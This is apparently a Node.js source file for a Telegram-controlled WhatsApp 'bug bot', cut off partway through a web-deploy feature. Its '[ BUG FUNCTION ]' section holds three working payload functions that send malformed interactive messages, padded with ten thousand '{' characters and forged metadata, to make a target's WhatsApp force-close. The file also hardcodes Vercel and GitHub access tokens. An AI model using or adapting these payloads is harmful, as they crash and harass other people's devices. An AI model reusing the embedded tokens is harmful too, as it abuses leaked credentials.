const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const {
  default: makeWASocket, useMultiFileAuthState,downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto,
  WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header,
} = require("@whiskeysockets/baileys");

const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const chalk = require("chalk");
const PREMIUM_FILE = "./database/premium.json");

// TAMBAHKAN INI - Token Vercel & GitHub
const vercelToken = "L6uK0vROD5lHr8NP2BlqqGAr"; // Ganti dengan token Vercel kamu
const githubToken = "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"; // Ganti dengan token GitHub kamu
const githubUsername = "barz379"; // Ganti dengan username GitHub kamu

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
SESSIONS_FILE = "./sessions/active_sessions.json";

function loadPremiumUsers() {
  try {
    if (!fs.existsSync(PREMIUM_FILE)) {
      fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(PREMIUM_FILE));
  } catch (error) {
    console.error("Error loading premium users:", error);
    return [];
  }
}
// SAVE JIKA ADDPREM
function savePremiumUsers(users) {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.error("Error saving premium users:", error);
  }
}


async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

// MENGAMBIL DATA TOKEN DARI GITHUB
/*const GITHUB_TOKEN_LIST_URL = 'https://raw.githubusercontent.com/rans-beep/t-five-Security/refs/heads/main/T-FiveV1.json';

// MENGAMBIL TOKEN DARI GIRHUB
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; 
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

// CEK APAKAH TOKEN BOT MASUK DATABASE
async function validateToken() {
  console.log(chalk.blue("🔍 Check Database..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid!"));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}*/
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
      console.log(chalk.red(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
  console.log(chalk.red(`ACCESS ACCEPT ✅`));
  console.log(chalk.blue(`Enjoy using this script`));
};
startBot();
//validateToken(); // CEK DB
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
//SESSION AGAR BOT TERHUBUNG KE NOMOR WHATSAPP
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const rans = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          rans.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, rans);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          rans.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

{}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const rans = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  rans.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      rans.newsletterFollow("120363402042668210@newsletter");// bebas mau ubah
      rans.newsletterFollow("120363387182851100@newsletter");
      rans.newsletterFollow("120363419813999491@newsletter");
      sessions.set(botNumber, rans);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`, 
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const costum = "TAKATFIVE" // UBAH PAIRING CODE
          const code = await rans.requestPairingCode(botNumber, costum);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  rans.ev.on("creds.update", saveCreds);

  return rans;
}

// [ BUG FUNCTION ]
async function NullFc(rans, target) {
for (let r = 0; r < 15; r++) {
  const cards = [];  
  const header = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "109951162777600",
      seconds: 99999,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "⭑*🦠⃟⃰NullFc🔃",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      annotations: [{
        embeddedContent: {
          musicContentMediaId: "589608164114571",
          songId: "870166291800508",
          author: ".RansLonely", 
          title: "AnomaliExecutive",
          artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
          artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
          artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
          artistAttribution: "https://www.instagram.com/_u/adit6core_",
          countryBlocklist: true,
          isExplicit: true,
          artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
        },
        embeddedAction: true
      }]
    }, 
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "tfv-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "⭑*🦠⃟⃰𝐑͜͡𝐚᪳𝐧͎᪳᪳᪳᪳᪳᪳͠𝐬𝐭͢𝐞͡𝐜͜𝐡͝𝐗͍𝐁͟͜͡𝐮͢͠𝐠͢͡⋆‣ ⃟⃰᪻𝐙᪻𝐱𝐕⃪᪻ႊ𝙸𝚗𝚜𝚝𝚊𝚗𝚃𝚒𝚌𝚔",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "tfv with Broadcast",
              body: "𝐑͜͡𝐚᪳𝐧͎᪳᪳᪳᪳᪳᪳͠𝐬𝐭͢𝐞͡𝐜͜𝐡͝𝐗͍𝐁͟͜͡𝐮͢͠𝐠͢͡⋆‣ ⃟⃰᪻𝐙᪻𝐱𝐕⃪᪻ႊ𝙸𝚗𝚜𝚝𝚊𝚗𝚃𝚒𝚌𝚔",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://Ranstech.example.com",
              showAdAttribution: false 
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 15; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "⭑*𝐑͜͡𝐚᪳𝐧͎᪳᪳᪳᪳᪳᪳͠𝐬𝐭͢𝐞͡𝐜͜𝐡͝𝐗͍𝐁͟͜͡𝐮͢͠𝐠͢͡⋆‣ ⃟⃰᪻𝐙᪻𝐱𝐕⃪᪻ႊ𝙸𝚗𝚜𝚝𝚊𝚗𝚃𝚒𝚌𝚔",
          },
          carouselMessage: {
            cards,
            messageVersion: 1
          },
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            stanzaId: "RansZxV" + "-Id" + Math.floor(Math.random() * 99999), 
            forwardingScore: 100,
            isForwarded: true,
            mentionedJid: ["13135550002@s.whatsapp.net"], 
            externalAdReply: {
              title: "tfv",
              body: "",
              thumbnailUrl: "https://example.com/",
              mediaType: 1,
              mediaUrl: "",
              sourceUrl: "https://anomali-ai.example.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  },{});

  await rans.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: null
  });
}
}

async function ransrombak(rans, target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./apasi.mp4") },
    { upload: rans.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "ZvX V-rans" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "ZvX V-rans🐉",
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net"],
            externalAdReply: {
              title: "ZvX V-rans Broadcast",
              body: "Attack Force You",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https:/rans.example.com",
              showAdAttribution: false // trigger
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 10; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ZvX V-rans🐉"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net"
              },
              stanzaId: "ZvX V-rans" + "-Id" + Math.floor(Math.random() * 99999), // trigger
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550202@s.whatsapp.net"], // trigger
              externalAdReply: {
                title: "SentExoToSystem",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://rans.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await rans.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red("Void-rans Success Sending Invisible Force Close"));
}

async function invisSqL(rans, target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "rans Is Here",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREiMxBBEQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "Void-rans Execution"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await rans.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

// ENDS FUNC BUG 

// TAMBAHKAN FITUR CREATE WEB DI SINI
async function handleCreateWeb(ctx) {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id.toString();
  
  // Cek permission - hanya owner dan premium
  if (!isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan fitur ini.",
      { parse_mode: "Markdown" }
    );
  }

  const text = ctx.text;
  const args = text.split(' ').slice(1);
  const webName = args[0];

  if (!webName) {
    return bot.sendMessage(
      chatId,
      "Contoh penggunaan: `//cweb <namaweb>`\n\nContoh: `//cweb website-saya`",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah ada file yang di-reply
  if (!ctx.reply_to_message || !ctx.reply_to_message.document) {
    return bot.sendMessage(
      chatId,
      "⚠️ Silakan reply file .zip atau .html yang ingin diupload.\n\nReply file ZIP/HTML lalu ketik: `//cweb namwebsite`",
      { parse_mode: "Markdown" }
    );
  }

  const repliedMessage = ctx.reply_to_message;
  const file = repliedMessage.document;

  // Validasi tipe file
  if (!file.file_name.match(/\.(zip|html)$/)) {
    return bot.sendMessage(
      chatId,
      "❌ File harus berformat .zip atau .html\n\nFormat yang diterima:\n- File ZIP berisi website\n- File HTML tunggal"
    );
  }

  const formattedWebName = webName.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '');
  const domainCheckUrl = `https://${formattedWebName}.vercel.app`;

  let loadingMsg;

  try {
    // Kirim status loading
    loadingMsg = await bot.sendMessage(
      chatId,
      "⏳ Memeriksa ketersediaan nama domain..."
    );

    // Cek ketersediaan domain
    const check = await fetch(domainCheckUrl);
    if (check.status === 200) {
      await bot.editMessageText(
        `❌ Nama web *${formattedWebName}* sudah digunakan. Silakan gunakan nama lain.`,
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id,
          parse_mode: "Markdown"
        }
      );
      return;
    }
  } catch (e) {
    // Domain tersedia jika error (tidak ditemukan)
  }

  try {
    await bot.editMessageText(
      "📥 Mengunduh file...",
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      }
    );

    // Download file
    const fileLink = await bot.getFileLink(file.file_id);
    const fileResponse = await fetch(fileLink);
    const fileBuffer = Buffer.from(await fileResponse.arrayBuffer());
    
    const filesToUpload = [];

    if (file.file_name.endsWith('.zip')) {
